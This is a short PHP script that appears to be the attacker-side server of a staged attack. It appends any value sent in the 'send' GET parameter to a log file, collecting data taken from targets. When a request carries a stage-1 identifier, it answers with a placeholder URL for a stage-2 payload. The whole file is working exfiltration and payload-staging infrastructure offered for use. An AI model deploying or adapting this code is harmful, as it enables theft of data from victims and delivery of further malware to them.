<?php
#Server to retreive GET request
if(isset($_GET['send'])){
	$file = fopen("output.log", "a+");
	fwrite($file, $_GET['send']."\n");
}

#Upload (Stage-2) on the target
if(isset($_GET['id']) AND $_GET['id'] == 'IDstage1'){
    echo "urlStage2";
}
?>
